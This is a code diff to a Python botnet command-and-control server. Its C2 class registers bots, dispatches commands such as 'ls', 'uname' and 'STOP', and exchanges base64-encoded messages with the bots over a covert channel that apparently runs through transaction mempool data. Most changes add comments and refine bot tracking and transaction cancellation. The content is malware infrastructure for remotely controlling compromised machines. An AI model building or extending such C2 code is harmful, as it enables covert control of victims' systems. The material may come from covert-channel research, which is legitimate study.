@@ -79,6 +79,7 @@ class MempoolMessage:
     def __str__(self):
         return self.__getMsgString()
 
+
     def getData(self) -> str:
         return self.message
 
@@ -97,6 +98,11 @@ class MempoolMessage:
     def setMessage(self, _message:str):
         self.message = _message
 
+    ##
+    #   @brief Decode an encoded message
+    #   @return The decoded data as string
+    #
+
     @staticmethod
     def decodeData(data:str):
         base64_bytes = data.encode('UTF-8')
@@ -104,6 +110,10 @@ class MempoolMessage:
         message = message_bytes.decode('UTF-8')
         return message
 
+    ##
+    #   @brief Encode an plaintext message
+    #   @return The encoded data as string
+    #
     @staticmethod
     def encodeData(data:str):
         enc_result = data.encode('UTF-8')
@@ -111,6 +121,10 @@ class MempoolMessage:
         base64_message = base64_bytes.decode('UTF-8')
         return base64_message
 
+    ##
+    #   @brief Loads an enconded message
+    #   @return A MempoolMessage instance
+    #
     @staticmethod
     def load(encoded_message_string:str):
         message_string = MempoolMessage.decodeData(encoded_message_string[1:])        
@@ -122,12 +136,15 @@ class MempoolMessage:
 
 
 
-
+##
+#   @brief Manages channels with clients (bots)
+#
+#
 
 class C2C:
     #List all the available bots
-    bots = None
-    available_bots = None
+    bots = None             #List of available "bot_id" strings
+    available_bots = None   #List of "Bot" objects representing active bots
 
     issued_commands = None
 
@@ -146,8 +163,6 @@ class C2C:
     commands = None
 
 
-    sent = 0    #For testing purpose
-
     def __init__(self, _dest_addr:str=None, _priv_key:str=None, _commands=None):
         self.bots = set()
         self.available_bots = set()
@@ -158,7 +173,7 @@ class C2C:
         self.priv_key = _priv_key
 
         if _commands is None:
-            my_commands = list(('ls', 'uname', 'STOP'))
+            my_commands = list(('ls', 'uname', 'STOP'))     #Default commands
             self.commands = my_commands
         else:
             self.commands = _commands
@@ -189,6 +204,7 @@ class C2C:
         if data is False:
             return False
 
+        #TODO: handle in a better way
         if data in self.issued_commands:
             return False
         else:    
@@ -197,14 +213,24 @@ class C2C:
         log.debug("parseCommand:" + str(data))
 
         if data.getMessage() == "START":
-            cprint("NEW BOT SUBSCRIBED", 'green', attrs=['bold', 'blink'],)
-            bot_id = data.getBotID()  #Get last 5 char
-            self.__registerBot(bot_id)
-            return True
+            bot_id = data.getBotID()
+            if bot_id not in self.bots:
+                self.__registerBot(bot_id)
+                cprint("NEW BOT SUBSCRIBED", 'green', attrs=['bold', 'blink'],)
+                return True
+            return False
+
         elif data.getMessage() == "STOP":
             log.debug("Command already issued")
             return False
+
         elif data.getOrigin() == "C":    #Command issued by server
+
+            bot_id = data.getBotID()
+
+            if bot_id not in self.bots:  #Check if commands belong to an old bot
+                return True
+
             return False
         elif data.getOrigin() == "R":    #Bot response
             cprint("Bot response received", 'green', attrs=['bold'],)
@@ -234,23 +260,26 @@ class C2C:
             dec_data = data.decode('utf-8')
             recv_msg = MempoolMessage.load(dec_data)
 
-            #if not self.__isBotRegistered(recv_msg.getBotID()):
-                #channel.cancelTransaction()
-                #time.sleep(1)
-                #continue
-
             log.info("Received: " + str(recv_msg))
 
             if self.parseCommand(recv_msg):             #If the command is parsed correctly
-                #log.info("Cancelling transaction...")
-                #channel.cancelTransaction()
-                #print(colored('Transaction Cancelled', 'green', attrs=['bold']) + ", sending response...")
+
                 time.sleep(4)
 
                 log.debug("BOT ID: " + recv_msg.getBotID())
-                response_msg = MempoolMessage(recv_msg.getBotID(), "ls", str(recv_msg.getNonce() + 1), "server")
+
+
+                if recv_msg.getBotID() not in self.bots:
+                    log.info("Found messages related to old bots, cancelling...")
+                    channel.cancelTransaction()
+                    log.info("Transaction cancelled")
+                    continue
+
 
                 next_command = "STOP"
+
+                response_msg = MempoolMessage(recv_msg.getBotID(), next_command, str(recv_msg.getNonce() + 1), "server")
+
 
                 for bot in self.available_bots:
                     if bot.getBotID() == recv_msg.getBotID():
@@ -259,8 +288,8 @@ class C2C:
                 log.info("Sending '" + str(next_command) + "' command")
 
                 response_msg.setMessage(next_command)
-                print(str(response_msg))
-                channel.sendData(str(response_msg), overwrite=True, nonceMsg=response_msg.getNonce())   #ls CMD
+                log.debug(str(response_msg))
+                channel.sendData(str(response_msg), overwrite=True, nonceMsg=response_msg.getNonce()) 
 
 
 
@@ -288,7 +317,12 @@ class C2C:
         self.loop_thread.start()
 
 
+    ##
+    #   @brief Stop the C2C server
+    #
     def stop(self):
+        self.covert_ch.close()
+
         if self.loop_thread is None:
             log.warning("C2C already stopped")
             return
